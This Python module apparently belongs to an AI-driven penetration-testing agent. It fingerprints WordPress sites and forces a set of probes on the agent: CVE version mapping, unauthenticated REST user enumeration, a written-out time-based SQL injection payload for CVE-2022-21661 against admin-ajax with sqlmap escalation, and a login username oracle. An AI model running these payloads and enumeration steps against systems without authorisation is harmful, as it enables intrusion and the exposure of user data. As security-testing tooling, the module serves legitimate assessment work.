"""WordPress surface: fingerprint → mandatory probes.

Thin marketing sites still have REST user enum and known-core SQLi. Do not wait
on a rich capability map or WPScan quota. Joshua schedules these; specialists
prove or kill them.
"""

from __future__ import annotations

import json
import re
from typing import Any, Dict, List, Optional
from urllib.parse import urlparse

_WP_PATH_RE = re.compile(
    r"^/(?:wp-content|wp-json|wp-admin|wp-includes)(?:/|$)"
    r"|^/(?:wp-login\.php|xmlrpc\.php)$",
    re.I,
)

_USERS_PATH = "/wp-json/wp/v2/users"
_AJAX_PATH = "/wp-admin/admin-ajax.php"

# CVE-2022-21661 nested tax_query (WP < 5.8.3). SLEEP(2) vs SLEEP(0).
_AJAX_HEADERS = {"Content-Type": "application/x-www-form-urlencoded"}
_AJAX_BASELINE = 'action=loadmore&page=1&query={"tax_query":{"0":{"terms":["1"]}}}'
_AJAX_MUTANT = (
    'action=loadmore&page=1&query={"tax_query":{"0":{"terms":'
    '["1) AND (SELECT 1 FROM (SELECT SLEEP(2))x)-- -"]}}}'
)


def _g(cmap: Any, key: str, default: Any = None) -> Any:
    if cmap is None:
        return default
    if isinstance(cmap, dict):
        return cmap.get(key, default)
    return getattr(cmap, key, default)


def wordpress_from_map(cmap: Any) -> bool:
    """Use observed WordPress paths or an explicit fingerprint, not prose."""
    if "wordpress" in {str(c).lower() for c in (_g(cmap, "capabilities") or [])}:
        return True
    if any(re.search(r"\bwordpress fingerprinted\b", str(n), re.I)
           for n in (_g(cmap, "notes") or [])):
        return True
    observed = [*(_g(cmap, "pages_visited") or []), *(_g(cmap, "js_files") or [])]
    for endpoint in (_g(cmap, "api_endpoints") or []):
        observed.append(endpoint.get("path", "") if isinstance(endpoint, dict) else endpoint)
    for raw in observed:
        path = urlparse(str(raw)).path
        if _WP_PATH_RE.search(path):
            return True
    return False


def stamp_stack_on_map(
    cmap: Optional[Dict[str, Any]],
    state: Optional[Dict[str, Any]] = None,
) -> Optional[Dict[str, Any]]:
    """If observed technology says WordPress, stamp and re-finalize the map.

    Thin marketing sites often have `/` as the only page URL; the WP signal
    lives in Wappalyzer, not in the path list. Methodologies still need to seed.
    """
    if not isinstance(cmap, dict):
        return cmap
    already = wordpress_from_map(cmap)
    if already and cmap.get("methodologies"):
        return cmap
    if not already and not wordpress_detected(state):
        return cmap
    notes = list(cmap.get("notes") or [])
    if not already:
        notes.append(
            "WordPress fingerprinted (technology) — REST user enum and "
            "admin-ajax tax_query hunts are in-play even on a thin map."
        )
    patched = dict(cmap)
    patched["notes"] = notes
    if not patched.get("target"):
        patched["target"] = wordpress_origin(state)
    try:
        from app.services.agent.capability_map import build_capability_map_from_dict

        return build_capability_map_from_dict(patched).to_dict()
    except Exception:
        return patched


def wordpress_detected(state: Optional[Dict[str, Any]] = None) -> bool:
    """Only observed technology or mapped paths can trigger WordPress hunts.

    Kickoff prose, objectives, tool arguments, and model thoughts often mention
    WordPress as a hypothetical test and must not become a fingerprint.
    """
    state = state or {}
    technologies = (state.get("target_info") or {}).get("technologies") or []
    return any(re.search(r"\bwordpress\b", str(t), re.I) for t in technologies) or wordpress_from_map(
        state.get("capability_map")
    )


def wordpress_origin(state: Optional[Dict[str, Any]] = None) -> str:
    """Scheme+host for WP probes (no trailing slash)."""
    state = state or {}
    info = state.get("target_info") or {}
    for raw in (
        info.get("primary_target"),
        (state.get("capability_map") or {}).get("target"),
        state.get("objective"),
        state.get("original_objective"),
    ):
        text = str(raw or "").strip()
        if not text:
            continue
        if not text.startswith(("http://", "https://")):
            m = re.search(r"https?://[^\s\"']+", text)
            text = m.group(0) if m else f"https://{text.split()[0]}"
        parsed = urlparse(text.split()[0].rstrip(".,)"))
        if parsed.netloc:
            return f"{parsed.scheme or 'https'}://{parsed.netloc}".rstrip("/")
    return ""


def _trace_blob(step: Dict[str, Any]) -> str:
    args = step.get("tool_args") or {}
    if isinstance(args, dict):
        args_s = json.dumps(args, default=str)
    else:
        args_s = str(args)
    return " ".join(
        [
            str(step.get("tool_name") or ""),
            args_s,
            str(step.get("tool_output") or "")[:1500],
        ]
    ).lower()


def wordpress_probe_status(state: Optional[Dict[str, Any]] = None) -> Dict[str, bool]:
    """Which mandatory WP probes already ran (success not required)."""
    users = False
    ajax = False
    wpscan = False
    plugin_cves = False
    for step in state.get("execution_trace") or [] if state else []:
        if not isinstance(step, dict):
            continue
        name = str(step.get("tool_name") or "")
        if name == "fireteam_dispatch":
            # A specialist summary may mention a probe without executing it.
            continue
        blob = _trace_blob(step)
        if name == "execute_wpscan":
            wpscan = True
        if name == "check_cve_applicability":
            plugin_cves = True
        if _USERS_PATH in blob or ("wp-json" in blob and "users" in blob):
            users = True
        if _AJAX_PATH in blob or "tax_query" in blob or (
            name == "compare_requests" and "sleep(" in blob
        ):
            ajax = True
    return {"users_enum": users, "ajax_sqli": ajax, "wpscan": wpscan, "plugin_cves": plugin_cves}


def wordpress_missing_probes(
    state: Optional[Dict[str, Any]] = None,
) -> List[Dict[str, str]]:
    if not wordpress_detected(state):
        return []
    status = wordpress_probe_status(state)
    missing: List[Dict[str, str]] = []
    origin = wordpress_origin(state) or "https://TARGET"
    if not status.get("plugin_cves"):
        missing.append({
            "id": "wp_plugin_cves",
            "title": "WordPress plugin/core versions not mapped to CVEs",
            "next": (
                f"check_cve_applicability url={origin} — parse generator / Yoast "
                "HTML comments / ?ver= and compare to published ranges"
            ),
        })
    if not status["users_enum"]:
        missing.append({
            "id": "wp_users_enum",
            "title": "WordPress REST user enum not run",
            "next": (
                f"execute_curl GET {origin}{_USERS_PATH}?per_page=100 — "
                "200 + slug/name is a finding; do not wait on WPScan"
            ),
        })
    if not status["ajax_sqli"]:
        missing.append({
            "id": "wp_ajax_sqli",
            "title": "WordPress admin-ajax tax_query timing probe not run",
            "next": (
                f"compare_requests POST {origin}{_AJAX_PATH} "
                "SLEEP(0) vs SLEEP(2) nested tax_query; then SLEEP(4) if delta ≥ 1.5s"
            ),
        })
    return missing


def wordpress_forced_step(
    state: Optional[Dict[str, Any]] = None,
) -> Optional[Dict[str, Any]]:
    """Deterministic next WP probe, or None if not WP / probes already queued."""
    if not wordpress_detected(state):
        return None
    origin = wordpress_origin(state)
    if not origin:
        return None
    status = wordpress_probe_status(state)
    if not status.get("plugin_cves"):
        try:
            from app.services.agent.cve_applicability import wordpress_cve_map_forced_step

            step = wordpress_cve_map_forced_step(origin, state)
            if step:
                return step
        except Exception:
            pass
        return {
            "tool_name": "check_cve_applicability",
            "tool_args": {"url": origin},
            "thought": (
                "WordPress fingerprint — map homepage plugin/core versions to "
                "published CVEs (Glasswing observe) before REST enum."
            ),
        }
    if not status["users_enum"]:
        return {
            "tool_name": "execute_curl",
            "tool_args": {
                "args": f"-sS -D- {origin}{_USERS_PATH}?per_page=100",
            },
            "thought": (
                "WordPress fingerprint — unauth REST user enum first. "
                "WPScan is optional and must not block this."
            ),
        }
    if not status["ajax_sqli"]:
        ajax_url = f"{origin}{_AJAX_PATH}"
        return {
            "tool_name": "compare_requests",
            "tool_args": {
                "baseline": {
                    "method": "POST",
                    "url": ajax_url,
                    "headers": dict(_AJAX_HEADERS),
                    "body": _AJAX_BASELINE,
                },
                "mutant": {
                    "method": "POST",
                    "url": ajax_url,
                    "headers": dict(_AJAX_HEADERS),
                    "body": _AJAX_MUTANT,
                },
                "timeout": 20,
            },
            "thought": (
                "WordPress fingerprint — time-based SQLi differential on "
                "admin-ajax tax_query (CVE-2022-21661 class). Prove or kill with timing."
            ),
        }
    return None


def wordpress_hunt_note(state: Optional[Dict[str, Any]] = None) -> str:
    """Prompt block when WP is in play. Empty string otherwise."""
    if not wordpress_detected(state):
        return ""
    origin = wordpress_origin(state) or "https://TARGET"
    status = wordpress_probe_status(state)
    lines = [
        "\n\n## WordPress detected — hunt these surfaces NOW",
        "WPScan is OPTIONAL (known CVEs / plugin list). Do not wait on it. "
        "Homepage plugin versions (Yoast HTML comment, generator meta, ?ver=) "
        "ARE in-play — check_cve_applicability first. Then REST user enum + "
        "admin-ajax time-based SQLi.",
    ]
    if not status.get("plugin_cves"):
        lines.append(
            f"0. PASSIVE CVE MAP FIRST: check_cve_applicability(url=\"{origin}\"). "
            "Quote generator / Yoast comment / ?ver= evidence. Version-in-range "
            "is a finding (note auth preconditions). Do not skip this for WPScan."
        )
    else:
        lines.append(
            "0. Passive CVE map already ran — file create_finding for applicable "
            "version-in-range hits before moving on."
        )
    lines.append(
        f"1. Unauth REST user enum FIRST: execute_curl(args=\"-sS -D- {origin}"
        f"{_USERS_PATH}?per_page=100\"). "
        "A 200 with slug/name is a finding (user enumeration). Then create_finding "
        "with title/description/severity/target filled in."
        + (" ALREADY RAN — do not skip create_finding if slug/name returned." if status["users_enum"] else "")
    )
    lines.append(
        f"2. Time-based SQLi PoC (do this even if WPScan failed). "
        f"compare_requests on POST {origin}{_AJAX_PATH} with "
        "Content-Type: application/x-www-form-urlencoded. "
        f"baseline body: {_AJAX_BASELINE} "
        f"mutant body: {_AJAX_MUTANT} "
        "timeout=20. If elapsed_s delta ≥ 1.5s (TIME_BASED_INJECTION_CANDIDATE), "
        "repeat with SLEEP(4) then execute_sqlmap --technique=BT and create_finding "
        "with the timing table as evidence."
        + (" ALREADY RAN — publish or kill with the timing table." if status["ajax_sqli"] else "")
    )
    lines.append(
        f"3. Login oracle (ONE attempt per username, no brute force): POST {origin}/wp-login.php "
        "and compare 'not registered' vs 'password you entered for the username X is incorrect'."
    )
    if not status["wpscan"]:
        lines.append(
            "4. OPTIONAL later: execute_wpscan for plugin CVE mapping. Skip if it aborted "
            "(token/quota). Do not block the ajax/REST hunts on WPScan."
        )
    else:
        lines.append(
            "4. WPScan already ran or aborted — do NOT call it again. Continue ajax/REST."
        )
    return "\n".join(lines)
